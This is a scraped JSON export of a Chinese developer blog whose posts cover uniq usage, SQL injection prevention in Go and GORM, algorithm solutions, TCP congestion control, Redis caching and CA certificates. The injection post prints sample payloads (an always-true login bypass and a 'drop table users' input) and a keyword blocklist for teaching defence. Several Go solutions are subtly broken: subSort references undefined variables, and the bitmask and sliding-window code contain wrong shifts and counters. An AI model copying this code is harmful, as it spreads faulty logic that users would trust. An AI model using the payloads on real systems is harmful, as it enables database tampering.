-s，--skip-chars=N：跳过对前N个字符的比较 -u：unique，只打印非邻近的重复行 -z：设置行终止符为NUL（空），而不是换行符 -w：只对每行前N个字符进行比较 例子# 很明显，第一行命令，只做了相邻行的去重 uniq file.txt sort file.txt | uniq sort -u file.txt # 只显示单一行 uniq file.txt sort file.txt | uniq -u # 统计各行在文件中出现的次数： sort file.txt | uniq -c # 在文件中找出重复的行 sort file.txt | uniq -d 利用sort和uniq求两个文件的并集，交集和差集 并集：cat f1.txt f2.txt | sort|uniq &gt; file.txt 交集：cat f1.txt f2.txt | sort|uniq -d &gt; file.txt 差集：这里仅举例f1.txt相对于f2.txt的差集 cat f1.txt f2.txt | sort|uniq -d &gt; tmp.txt cat f1.txt f2.txt | sort|uniq -u &gt; file.txt","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"SQL注入","slug":"SQL注入","date":"2022-02-20T06:36:41.000Z","updated":"2022-02-20T06:53:39.748Z","comments":true,"path":"2022/02/20/sql-zhu-ru/","link":"","permalink":"https://github.com/z-anshun/2022/02/20/sql-zhu-ru/","excerpt":"","text":"什么是SQL注入SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞 有什么危害？ 可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限 为什么会造成？ 程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码 换句话说，就是将用户输入的语句，直接作为了执行语句的一部分 注入实例假设，我们的SQL处理如下： username:=r.Form.Get(\"username\") password:=r.Form.Get(\"password\") sql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\" Db.Exec(sql) 那么，如果用户输入的用户名为myuser' or 'foo' = 'foo' -- 然后，我们的SQL语句就变成了如下： SELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx' 也就是，我们的SQL语句，很有可能变成我们预料的执行，甚至创建用户、直接获取表单等 如何预防 限制Web应用对数据库操作的权限 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp包进行一些匹配处理，或者使用strconv包对字符串转化成其他基本类型的数据进行判断（如：int类型的转换） 如： // 正则过滤sql注入的方法 // 参数 : 要匹配的语句 func FilteredSQLInject(to_match_str string) bool { //过滤 ‘ //ORACLE 注解 -- /**/ //关键字过滤 update ,delete // 正则的字符串, 不能用 \" \" 因为\" \"里面的内容会转义 str := `(?:')|(?:--)|(/\\\\*(?:.|[\\\\n\\\\r])*?\\\\*/)|(\\b(select|update|and|or|delete|insert|trancate|char|chr|into|substr|ascii|declare|exec|count|master|into|drop|execute)\\b)` re, err := regexp.Compile(str) if err != nil { panic(err.Error()) return false } return re.MatchString(to_match_str) } 对进入数据库的特殊字符（’”\\尖括号&amp;*;等）进行转义处理，或编码转换。Go 的text/template包里面的HTMLEscapeString函数可以对字符串进行转义处理 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。例如使用database/sql里面的查询函数Prepare和Query，或者Exec(query string, args ...interface{}) 在应用发布之前建议使用专业的SQL注入检测工具进行检测，以及时修补被发现的SQL注入漏洞。网上有很多这方面的开源工具，例如sqlmap、SQLninja等 避免直接打印SQL的错误信息 GORM 是如何避免的首先，GROM是对预处理进行了封装，所有个别查询可以使用到，但个别却没有，如： userInput := \"jinzhu;drop table users;\" // 安全的，会被转义 db.Where(\"name = ?\", userInput).First(&amp;user) // SQL 注入 db.Where(fmt.Sprintf(\"name = %v\", userInput)).First(&amp;user) // 会被转义 db.First(&amp;user, \"name = ?\", userInput) // SQL 注入 db.First(&amp;user, fmt.Sprintf(\"name = %v\", userInput)) 很明显，应该尽量将用户的输入当作参数输入，而不是直接进行语SQL语言的拼接 注意：GORM 打印的 SQL 日志并不像最终执行的 SQL 那样已经转义，复制和运行这些 SQL 时应当注意","categories":[{"name":"安全","slug":"安全","permalink":"https://github.com/z-anshun/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://github.com/z-anshun/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"部分排序","slug":"部分排序","date":"2022-02-13T12:01:55.000Z","updated":"2022-02-13T12:17:12.888Z","comments":true,"path":"2022/02/13/bu-fen-pai-xu/","link":"","permalink":"https://github.com/z-anshun/2022/02/13/bu-fen-pai-xu/","excerpt":"","text":"题目： 面试题 16.16. 部分排序给定一个整数数组，编写一个函数，找出索引m和n，只要将索引区间[m,n]的元素排好序，整个数组就是有序的。注意：n-m尽量最小，也就是说，找出符合条件的最短序列。函数返回值为[m,n]，若不存在这样的m和n（例如整个数组是有序的），请返回[-1,-1]。 示例： 输入： [1,2,4,7,10,11,7,12,6,7,16,18,19] 输出： [3,9] 提示： 0 &lt;= len(array) &lt;= 1000000 分析： 很明显，对于array[m+1:]，存在一个比array[m]小的数，对于array[:n]，存在一个比array[n]大的数 那我们先来看n，假设左边最大的数为max，那么array[n+1]一定大于max，也就是说，我们需要在从左往右遍历，在遍历过程中记录当前最大的值，如果当前比它小，那么这就是n的值，代码如下： max:=array[0] for i:=1;i&lt;len(array);i++{ if array[i]&lt;max{ // 该值比当前max小，为右边界 n=i }else{ // 记录当前最大 max=array[i] } } m的寻找类似，只需从右往左找到一个比当前最小值min大的，那就是m 代码实现： func subSort(array []int) []int { n:=len(array) if n&lt;=1{ return []int{-1,-1} } l:=-1 r:=-1 max:=array[0] min:=array[n-1] for i:=1;i&lt;n;i++{ if array[i]&lt;ll{ r=i }else{ max=array[i] } end:=n-1-i if array[end]&gt;rr{ l=end }else{ m=array[end] } } return []int{l,r} }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"拥塞控制协议","slug":"拥塞控制协议","date":"2022-02-07T12:43:46.000Z","updated":"2022-02-07T12:44:36.212Z","comments":true,"path":"2022/02/07/yong-sai-kong-zhi-xie-yi/","link":"","permalink":"https://github.com/z-anshun/2022/02/07/yong-sai-kong-zhi-xie-yi/","excerpt":"","text":"流量控制 什么是流量控制？目的？ 发送者发送的数据过快，接受者来不及接受，那么就会有分组丢失的情况。为了避免这种情况，我们就需要控制发送者的速度，使接收方能及时接收。其目的是防止分组丢失，控制TCP的可靠性的一方面 如何实现？ 可以使用滑动窗口协议（连续ARQ协议）实现。既保证了分组无差错、有序接收，也实现了流量控制。 主要方式为接收方返回的ACK中会包含自己的接收窗口的大小，并利用大小来控制发送方的数据发送 为啥会引发死锁？怎么避免？ 若发送者收到了一个窗口为0的应答，那么发送者就会停止发送，等待接收者的下一个应答。但是如果这个窗口不为0的应答在传输过程丢失，发送者一直等待下去，而接收者以为发送者已经收到该应答，等待接收新数据，这样双方就相互等待，从而产生死锁 TCP使用了持续计数器。每当发送者收到一个零窗口的应答后就启动该计时器。时间一到便主动发送报文询问接收者的窗口大小。若接收者仍然返回零窗口，则重置该计时器继续等待；若窗口不为0，则表示应答报文丢失了，此时重置发送窗口后开始发送，这样就避免了死锁的产生（类似于心跳包） 拥塞控制和流量控制的区别 拥塞控制： 作用于网络，防止过多的数据注入到网络中，避免出现网络负载过大的情况。常见做法为： 慢开始、拥塞避免 快重传、快恢复 流量控制： 作用于接收者，控制发送者的发送速度，从而使接收者来得及接收，防止分组的丢失 拥塞控制的算法假设： 1、数据是单方向传递，另一个窗口只发送确认； 2、接收方的缓存足够大，因此发送方的大小的大小由网络的拥塞程度来决定 慢开始算法发送方维持一个叫做拥塞窗口cwnd（congestion window）的状态变量。其变量大小取决于网络的拥塞程度，并动态的在变化。发送方让自己的发送窗口等于拥塞窗口，另外考虑到接受方的接收能力，发送窗口可能小于拥塞窗口 为啥叫慢开始？ 因为一开始不会发送大量的数据，而是先探测网络的拥塞程度，也就是由小到大逐渐增加拥塞窗口的大小 这里用报文段的个数作为拥塞窗口的大小举例说明慢开始算法，实际的拥塞窗口大小是以字节为单位的。如下图： 发送方每收到一个ack就把cwnd+1， 另外一个传输轮次所经历的时间其实就是往返时间RTT，且每经过一次传输轮次（transmission round），拥塞窗口cwnd就加倍 当然，cwnd不会无限增长，还需设置一个慢开始门限ssthresh状态变量。 当cwnd&gt;ssthresh时，改为拥塞避免算法 当cwnd=ssthresh时，慢开始与拥塞避免算法任意 注意，这里的“慢”并不是指cwnd的增长速率慢，而是指在TCP开始发送报文段时先设置cwnd=1，然后逐渐增大，这当然比按照大的cwnd一下子把许多报文段突然注入到网络中要“慢得多” 拥塞避免算法当拥塞窗口大于等设置的拥塞门限时，就需要使用该算法， 让拥塞窗口缓慢增长，即每经过一个往返时间RTT就把发送方的拥塞窗口cwnd加1（原来为每个ACK），而不是加倍。这样拥塞窗口按线性规律缓慢增长 什么是拥塞？发送了拥塞咋办？为什么怎么做？ 拥塞：没有按时收到确认，虽然没有收到确认可能是其他原因的分组丢失，但是因为无法判定，所以都当做拥塞来处理 解决：无论时慢开始阶段，还是拥塞避免阶段。只要发生了拥塞 慢开始门限ssthresh设置为出现拥塞时的发送窗口大小的一半（但不能小于2） 把拥塞窗口cwnd设置为1 再次执行慢开始算法 目的：迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕 拥塞窗口cwnd初始化为1个报文段，慢开始门限初始值为16 执行慢开始算法，指数规律增长到第4轮，即cwnd=16=ssthresh，改为执行拥塞避免算法，拥塞窗口按线性规律增长 假定cwnd=24时，网络出现超时（拥塞），则更新后的ssthresh=12，cwnd重新设置为1，并执行慢开始算法。当cwnd=12=ssthresh时，改为执行拥塞避免算法 乘法减小（Multiplicative Decrease）：无论是在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞，就把慢开始门限ssthresh设置为出现拥塞时的发送窗口大小的一半，并执行慢开始算法，所以当网络频繁出现拥塞时，ssthresh下降的很快，以大大减少注入到网络中的分组数 加法增大（Additive Increase）：执行拥塞避免算法后，使拥塞窗口缓慢增大，以防止过早出现拥塞 所以避免拥塞算法也叫AIMD算法 注意：“拥塞避免”并非完全能够避免了阻塞，而是使网络比较不容易出现拥塞 快重传算法快重传要求接收方在收到一个失序的报文段后就立即发出重复确认（为的是使发送方及早知道有报文段没有到达对方，可提高网络吞吐量约20%）而不要等到自己发送数据时捎带确认。快重传算法规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期 b s m1 -&gt; &lt;- ack m1 m2 -&gt; &lt;- ack m2 m3 -&gt; m4 -&gt; &lt;- m3丢失 m5 -&gt; &lt;- m3丢失 m6 -&gt; &lt;- m3丢失 m3 -&gt; 快恢复算法快重传配合使用的还有快恢复算法 当发送方连续收到三个重复确认时，就执行“乘法减小”算法，把cwnd减半,并赋值给ssthresh门限（为了预防网络发生拥塞） 后面并不执行慢开始算法，而是执行执行拥塞避免算法，使cwnd缓慢增大 注意：采用了快恢复算法后，慢开始算法只会在建立TCP连接和网络超时的时候出现","categories":[{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://github.com/z-anshun/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"二叉树转双向链表","slug":"二叉树转双向链表","date":"2022-02-06T10:52:02.000Z","updated":"2022-02-06T11:07:27.557Z","comments":true,"path":"2022/02/06/er-cha-shu-zhuan-shuang-xiang-lian-biao/","link":"","permalink":"https://github.com/z-anshun/2022/02/06/er-cha-shu-zhuan-shuang-xiang-lian-biao/","excerpt":"","text":"剑指 Offer 36. 二叉搜索树与双向链表输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 如： 4 | | 2 5 | | 1 3 就需要依照中序遍历的结果的双向链表 1 2 3 4 5 分析，对于一棵二叉树的更改，很明显我们需要对其所有节点进行遍历，这里采用深度优先 func dfs(n *Node){ if n==nil{ return } dfs(n.Left) // 当前n dfs(n.Right) } 那么，如果我们能记录当前n的遍历的前一个点，令其为pre 执行如下操作 // 这里不考虑左右节点，直接进行更改 pre.Right=n n.Left=pre pre=n 那么自然就成为了双向链表 代码实现： func main() { t:= CreateTree([]int{4, 2, 5, 1, 3}) link := TreeToLink(t) for i:=0;i&lt;5;i++{ fmt.Printf(\"%d\\t\",link.Val) link=link.Right } } type Node struct { Val int Left *Node Right *Node } // 层序遍历构建树 func CreateTree(arr []int) *Node { ns := []*Node{} for i, v := range arr { n := &amp;Node{Val: v} ns = append(ns, n) if i != 0 { f := ns[(i-1)/2] if i&amp;1 == 1 { f.Left = n } else { f.Right = n } } } return ns[0] } func TreeToLink(root *Node) *Node { var pre,l *Node var dfs func(n *Node) dfs= func(n *Node) { if n==nil{ return } dfs(n.Left) n.Left=pre if pre==nil{ l=n }else{ pre.Right=n } n.Left=pre pre=n dfs(n.Right) } dfs(root) // t root.Left=pre pre.Right=root return l }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://github.com/z-anshun/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"乘积小于K的子数组","slug":"乘积小于K的子数组","date":"2022-02-02T09:56:45.000Z","updated":"2022-02-02T10:37:19.489Z","comments":true,"path":"2022/02/02/cheng-ji-xiao-yu-k-de-zi-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2022/02/02/cheng-ji-xiao-yu-k-de-zi-shu-zu/","excerpt":"","text":"剑指 Offer II 009. 乘积小于 K 的子数组给定一个正整数数组 nums和整数 k ，请找出该数组内乘积小于 k 的连续的子数组的个数。 示例 1: 输入: nums = [10,5,2,6], k = 100 输出: 8 解释: 8 个乘积小于 100 的子数组分别为: [10], [5], [2], [6], [10,5], [5,2], [2,6], [5,2,6]。 需要注意的是 [10,5,2] 并不是乘积小于100的子数组。 分析： 首先，题目要求的为连续子数组，也就是说如例一的[10,2]这种不满足要求 既然为连续，那么首先便考虑到了滑动窗口的做法： 令l为左边界下标，r为右边界下标 l=0,r=0，当前窗口[10]，乘积为10，满足，符合的子数组:[10] l=0,r=1，当前窗口[10,5]，乘积为50，满足，符合的子数组：[10],[10,5],[5] l=0,r=2，当前窗口[10,5,2]，乘积为100，不满足，l++ l=1,r=2，当前窗口[5,2]，乘积为10，满足，符合的子数组：[10],[10,5],[5],[5,2],[2] l=1,r=3，当前窗口[5,2,6]，乘积为60，满足，符合的子数组：[10],[10,5],[5],[5,2],[2],[5,2,6],[2,6],[6] 进而，我们发现，每次满足时，新增的子数组个数为r-l+1，即包含新增的nums[r]的子集 代码实现： func numSubarrayProductLessThanK(nums []int, k int) int { res:=0 n:=len(nums) l:=0 now:=1 for r:=0;r&lt;n;r++{ now*=nums[r] for l&lt;r&amp;&amp;now&gt;=k{ now/=nums[l] l++ } if r&gt;=l&amp;&amp;now&lt;k{ res+=r-l+1 } } return res }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://github.com/z-anshun/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"}]},{"title":"缓存穿透、雪崩、击穿","slug":"缓存穿透、雪崩、击穿","date":"2022-02-01T12:45:37.000Z","updated":"2022-02-01T13:04:43.344Z","comments":true,"path":"2022/02/01/huan-cun-chuan-tou-xue-beng-ji-chuan/","link":"","permalink":"https://github.com/z-anshun/2022/02/01/huan-cun-chuan-tou-xue-beng-ji-chuan/","excerpt":"","text":"缓存穿透指查询一个不存在的数据，那么肯定缓存里没有，就会查找DB，如果DB也没有，那么就不会写入缓存，这就是会导致每次对该数据查询的时候都要去DB进行查询，进而缓存便失去了意义，而当流量大的时候，DB可能会直接挂掉 如何解决？ 将空值也进行缓存 if v:=reids.Get(key);v==nil{ v,err=db.Get(key) if err==db.DBNoFound{ redis.Set(key,nil) } } 使用布隆过滤器：当某个不存在时，则一定不存在 缓存雪崩缓存雪崩是指在我们设置缓存时采用了相同的过期时间，导致缓存在某一时刻同时失效，请求全部转发到DB，DB瞬时压力过重挂掉。 如何解决？ 在原有的失效时间基础上增加一个随机值，使得过期时间分散一些。 缓存击穿大量的请求同时查询一个 key 时，此时这个 key 正好失效了，还未来得急写入，就会导致大量的请求都落到数据库。 注意：缓存击穿是查询缓存中失效的 key，而缓存穿透是查询不存在的 key 如何解决？ 加分布式锁，第一个请求的线程可以拿到锁，拿到锁的线程查询到了数据之后设置缓存，其他的线程获取锁失败会等待几十ms然后重新到缓存取数据，这样便可以避免大量的请求落到数据库 func GetVal(key string)interface{}{ v:=redis.Get(key) if v==nil{ unique_key:=systemId+\"_\"+key if redis.Set(unique_key,1,\"NX\",\"PX\",30000)==1{ v=db.Get(key) redis.Set(key,v) redis.Del(unique_key) }else{ time.Sleep(50) // 休眠50ms return GetVal(key) } } return v }","categories":[{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://github.com/z-anshun/tags/Redis/"}]},{"title":"最长的美好子字符串","slug":"最长的美好子字符串","date":"2022-02-01T12:00:01.000Z","updated":"2022-02-01T12:45:00.954Z","comments":true,"path":"2022/02/01/zui-chang-de-mei-hao-zi-zi-fu-chuan/","link":"","permalink":"https://github.com/z-anshun/2022/02/01/zui-chang-de-mei-hao-zi-zi-fu-chuan/","excerpt":"","text":"最长美好子字符串 1763. 最长的美好子字符串当一个字符串 s 包含的每一种字母的大写和小写形式 同时 出现在 s 中，就称这个字符串 s 是 美好 字符串。比方说，\"abABB\" 是美好字符串，因为 'A' 和 'a' 同时出现了，且 'B' 和 'b' 也同时出现了。然而，\"abA\" 不是美好字符串因为 'b' 出现了，而 'B' 没有出现。 给你一个字符串 s ，请你返回 s 最长的 美好子字符串 。如果有多个答案，请你返回 最早 出现的一个。如果不存在美好子字符串，请你返回一个空字符串。 示例 1： 输入：s = \"YazaAay\" 输出：\"aAa\" 解释：\"aAa\" 是一个美好字符串，因为这个子串中仅含一种字母，其小写形式 'a' 和大写形式 'A' 也同时出现了。 \"aAa\" 是最长的美好子字符串。 法1：枚举首先，对于一个字符串存在的英文字母，我们需要对其做标记，这里我们使用二进制方法最为简便 mask:=uint(0) // 假设这里的str全为小写字母 for _,ch:=range str{ mask|=1&gt;&gt;(ch-'a') } 然后，我们对s的子字符串枚举，即s[i:j]，令其大写字母的标记upper，小写字母的标记lower，当两个标记相等时，即为完美子字符串，进而获取最长的即可 代码实现： func longestNiceSubstring(s string) string { n:=len(s) res:=\"\" for i:=0;i&lt;n-1;i++{ lower,upper:=0,0 for j:=i;j&lt;n;j++{ if s[j]&gt;='a'&amp;&amp;s[j]&lt;='z'{ lower|=1&lt;&lt;(s[j]-'a') }else{ upper|=1&lt;&lt;(s[j]-'A') } if lower==upper&amp;&amp;len(res)&lt;j-i+1{ res=s[i:j+1] } } } return res } 时间复杂度：O*(*n^2) 空间复杂度：O(1) 法2：分治既然为字符串，那么一定在其某个分段里 如何分段？ 我们首先对整个字符串获取到upper和lower的标记，然后取并,就知道需要哪些大小字母，也就知道哪些字母一定不会在最终结果， 进而就可以对其进行分段 代码实现： func longestNiceSubstring(s string) (ans string) { if s == \"\" { return } lower, upper := 0, 0 for _, ch := range s { if unicode.IsLower(ch) { lower |= 1 &lt;&lt; (ch - 'a') } else { upper |= 1 &lt;&lt; (ch - 'A') } } // 如果当前即为完美字符串 if lower == upper { return s } // 获取可能需要的字母标记 v := lower &amp; upper for i := 0; i &lt; len(s); i++ { start := i idx := unicode.ToLower(rune(s[i])) - 'a' // 获取到对应的标记 // 右边最大的下标 for i &lt; len(s) &amp;&amp; v&amp;(1&gt;&gt;idx) == 1 { i++ } t := longestNiceSubstring(s[start:i]) if len(ans) &lt; len(t) { ans = t } } return } 时间复杂度：O(n⋅∣Σ∣)，其中 n 为字符串的长度，∣Σ∣ 为字符集的大小，这里因为英文字母为52个（包含大小写），即使|Σ|=52，其递归深度，最大为|Σ|/2=26，因为每次递归会去掉一个肯定不会出现在结果里的字母 空间复杂度：O(|Σ|)，递归深度为|Σ|/2 法3：滑动窗口首先，我们能够获取到该字符串的总的字母类型（不分大小写），令其为maxNum（maxNum&gt;0&amp;&amp;maxNum&lt;=26） 那么，我们就能枚举，当前的字母类型，从1~maxNum， 最后，我们进行窗口滑动，设置几个变量 upper,lower：[26]int数组，分别为大小写字母的个数 total：即当前窗口总的种类，当有一个新字母进来时+1 cnt 当前窗口满足的条件的种类，当一个字母满足既有大写和小写时+1 l：左边界，当total大于当前枚举的类型时，就需要移动左边界进行缩减，当前缩减时，需要将对应的值进行改变 r：右边界 进而在枚举过程中，就能获取到最长的完美子字符串 代码实现： func longestNiceSubstring(s string) (ans string) { mask := uint(0) for _, ch := range s { mask |= 1 &lt;&lt; (unicode.ToLower(ch) - 'a') } maxNum := bits.OnesCount(mask) for i := 1; i &lt;= maxNum; i++ { var lowerC, upperC [26]int total, cnt, l := 0, 0, 0 for r, ch := range s { idx := unicode.ToLower(ch) - 'a' if ch &gt;= 'a' &amp;&amp; ch &lt;= 'z' { lowerC[idx]++ if lowerC[idx] == 1 &amp;&amp; upperC[idx] &gt; 0 { cnt++ } } else { upperC[idx]++ if upperC[idx] == 1 &amp;&amp; lowerC[idx] &gt; 0 { cnt++ } } // 只含有一个 if lowerC[idx]+upperC[idx] == 1 { total++ } // 当总的个数大于当前类型个数了 for total &gt; i { idx := unicode.ToLower(rune(s[l])) - 'a' if lowerC[idx]+upperC[idx] == 1 { total-- } if s[l] &gt;= 'a' &amp;&amp; s[l] &lt;= 'z' { lowerC[idx]-- if lowerC[idx] == 0 &amp;&amp; upperC[idx] &gt; 0 { cnt-- } } else { upperC[idx]-- if upperC[idx] == 0 &amp;&amp; lowerC[idx] &gt; 0 { cnt++ } } l++ } if cnt == i &amp;&amp; r-l+1 &gt; len(ans) { ans = s[l : r+1] } } } return } 时间复杂度：O(n⋅∣Σ∣)，其中 n 为字符串的长度，∣Σ∣ 为字符集的大小 空间复杂度：O(∣Σ∣)。需要 O(∣Σ∣) 存储所有大小写字母的计数 衍生题： 395. 至少有 K 个重复字符的最长子串给你一个字符串 s 和一个整数 k ，请你找出 s 中的最长子串， 要求该子串中的每一字符出现次数都不少于 k 。返回这一子串的长度。 示例 1： 输入：s = \"aaabb\", k = 3 输出：3 解释：最长子串为 \"aaa\" ，其中 'a' 重复了 3 次。 法1：分治跟上题一样的做法，在拆分时，我们对个数小于k的字母进行拆分即可 代码实现 func longestSubstring(s string, k int) int { var r [26]int for _, v := range s { r[v-'a']++ } var split byte for i, v := range r[:] { if v &gt; 0 &amp;&amp; v &lt; k { split = byte(i) + 'a' break } } if split == 0 { return len(s) } strs := strings.Split(s, string(split)) res := 0 for _, str := range strs { res = max(res, longestSubstring(str, k)) } return res } func max(x, y int) int { if x &gt; y { return x } return y } 法2：滑动窗口跟上题类似，直接亮代码 func longestSubstring(s string, k int) (ans int) { for i := 1; i &lt; 26; i++ { cnt := [26]int{} l := 0 // 左 total := 0 // 总的种类 lessK := 0 // 少于K个的种类 for r, ch := range s { idx := ch - 'a' if cnt[idx] == 0 { lessK++ total++ } cnt[idx]++ if cnt[idx] == k { lessK-- } for total &gt; i { idx := s[l] - 'a' if cnt[idx] == k { lessK++ } cnt[idx]-- if cnt[idx] == 0 { total-- lessK-- } } if lessK == 0 &amp;&amp; ans &lt; r-l+1 { ans = r - l + 1 } } } return }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"跳跃游戏","slug":"跳跃游戏","date":"2022-01-22T14:53:29.000Z","updated":"2022-01-22T15:01:11.188Z","comments":true,"path":"2022/01/22/tiao-yue-you-xi/","link":"","permalink":"https://github.com/z-anshun/2022/01/22/tiao-yue-you-xi/","excerpt":"","text":"题目： 1345. 跳跃游戏 IV给你一个整数数组 arr ，你一开始在数组的第一个元素处（下标为 0）。 每一步，你可以从下标 i 跳到下标： i + 1 满足：i + 1 &lt; arr.length i - 1 满足：i - 1 &gt;= 0 j 满足：arr[i] == arr[j] 且 i != j 请你返回到达数组最后一个元素的下标处所需的 最少操作次数 。 注意：任何时候你都不能跳到数组外面。 示例 1： 输入：arr = [100,-23,-23,404,100,23,23,23,3,404] 输出：3 解释：那你需要跳跃 3 次，下标依次为 0 --&gt; 4 --&gt; 3 --&gt; 9 。下标 9 为数组的最后一个元素的下标。 分析： 因为一个点，可以到i-1、i+1和值相同的点（i为0就没i-1，i为n-1就没i+1,这里的i为arr的下标），那么，很明显，可以构造一个图，使用邻接表进行记录。 然后，我们再从0下标开始进行节点的遍历，因为要求的最少，所以需要一个map对经过的节点记录（约早可抵达的，肯定步数越少） 代码实现： type pair struct { idx,step int } func minJumps(arr []int)int{ n:=len(arr) idx:=map[int][]int{} for i, v := range arr { idx[v] = append(idx[v], i) } vis:=map[int]bool{0:true} // 下标 -&gt; 是否走过 q:=[]pair{{}} for { // pop p:=q[0] q=q[1:] i,step:=p.idx,p.step if i==n-1{ return step } for _,j:=range idx[arr[i]]{ if !vis[j]{ vis[j]=true q = append(q, pair{j,step+1}) } } delete(idx,arr[i]) // 往后 if !vis[i+1]{ vis[i+1]=true q = append(q, pair{i+1,step+1}) } if i&gt;0&amp;&amp;!vis[i-1]{ vis[i-1]=true q = append(q, pair{i-1,step+1}) } } }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"BFS","slug":"BFS","permalink":"https://github.com/z-anshun/tags/BFS/"}]},{"title":"最长重复子数组","slug":"最长重复子数组","date":"2022-01-22T14:29:51.000Z","updated":"2022-01-22T14:52:06.050Z","comments":true,"path":"2022/01/22/zui-chang-chong-fu-zi-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2022/01/22/zui-chang-chong-fu-zi-shu-zu/","excerpt":"","text":"题目：718. 最长重复子数组 给两个整数数组 A 和 B ，返回两个数组中公共的、长度最长的子数组的长度。 示例： 输入： A: [1,2,3,2,1] B: [3,2,1,4,7] 输出：3 解释： 长度最长的公共子数组是 [3, 2, 1] 。 提示： 1 &lt;= len(A), len(B) &lt;= 1000 0 &lt;= A[i], B[i] &lt; 100 分析： 首先，对于数组A和B，我们创建下面一个表 0 1 2 3 4 0 0 0 1 0 0 1 0 1 0 1 0 2 1 0 0 0 1 3 0 0 0 0 0 4 0 0 0 0 0 其中，横竖轴分表为两个数组的下标，相同为1，不相同为0 那么，仔细观察，我们就能得出递推公式$$若A[i]==B[j]\\dp[i][j]=dp[i-1][j-1]+1\\反之\\dp[i][j]=0$$代码实现： func findLength(nums1 []int, nums2 []int) int { n,m:=len(nums1),len(nums2) dp:=make([][]int,n) for i:=range dp{ dp[i]=make([]int,m) } res:=0 for i:=0;i&lt;n;i++{ for j:=0;j&lt;m;j++{ if nums1[i]==nums2[j]{ if i==0||j==0{ dp[i][j]=1 }else{ dp[i][j]=dp[i-1][j-1]+1 } res=max(dp[i][j],res) } } } return res } func max(x,y int)int{ if x&gt;y{ return x } return y } 当然，这个也可以用在找最长公共子字符串","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"CA证书","slug":"CA证书","date":"2022-01-19T04:53:30.000Z","updated":"2022-02-07T12:44:50.145Z","comments":true,"path":"2022/01/19/ca-zheng-shu/","link":"","permalink":"https://github.com/z-anshun/2022/01/19/ca-zheng-shu/","excerpt":"","text":"认证中心CACertificate Authority，证书认证中心 流程： 服务端S会向第三方CA提交公钥（记住不是私钥，私钥自己留着）、组织信息、个人信息（域名）等信息并申请认证 CA通过线上、线下等多种手段，验证申请者提供信息的真实性，如组织是否存在、企业是否合法，是否拥有域名的所有权等 .如信息审核通过，CA会向申请者签发认证文件-证书 证书包含以下信息：申请者的公钥、申请者的组织信息和个人信息、签发机构CA的信息、有效时间、证书序列号等信息的明文，同时还有一个签名 签名：首先使用散列函数计算公开的明文信息的信息摘要，然后，使用CA的私钥进行加密，其加密后的密文就是签名 客户端C向服务器S发送请求，S返回证书文件 客户端C读取证书中的明文信息，采用相同的散列函数计算得到信息摘要，然后，利用对应CA的公钥解密签名数据，对比证书的信息摘要，如果一致，则可以确认证书的合法性，即公钥合法 客户端然后验证证书相关的域名信息、有效时间等信息; 客户端会**内置信任CA的证书信息(包含公钥)**，如果CA不被信任，则找不到对应 CA的证书，证书也会被判定非法 过程中需要注意的： 这里出现了两个公钥，一个CA的，一个服务器自己的，发送的信息中携带着公钥 证书的合法性仍然依赖于非对称加密算法，证书主要是增加了服务器信息以及签名; 内置 CA 对应的证书称为根证书，颁发者和使用者相同，自己为自己签名，即自签名证书（为什么说”部署自签SSL证书非常不安全”） 证书=公钥（服务方生成密码对中的公钥）+申请者与颁发者信息+签名（用CA机构生成的密码对的私钥进行签名） 